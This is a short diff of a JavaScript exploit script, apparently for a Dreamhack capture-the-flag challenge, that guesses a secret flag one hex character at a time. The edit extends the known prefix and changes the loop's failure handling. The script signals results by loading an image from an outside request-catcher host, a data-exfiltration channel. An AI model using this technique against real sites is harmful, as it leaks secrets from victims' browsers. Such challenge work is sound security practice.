@@ -21,7 +21,7 @@
 
     async function exploit() {
         let chars = "0123456789abcdef}";
-        let secret = "DH{22";
+        let secret = "DH{22d";
 
         while (!secret.includes("}")) {
             let promises = chars.split("").map(c => 
@@ -42,7 +42,6 @@
 
             if (!found) {
                 img.src = `https://rwawwcz.request.dreamhack.games/failed`;
-                return;
             }
         }
     }
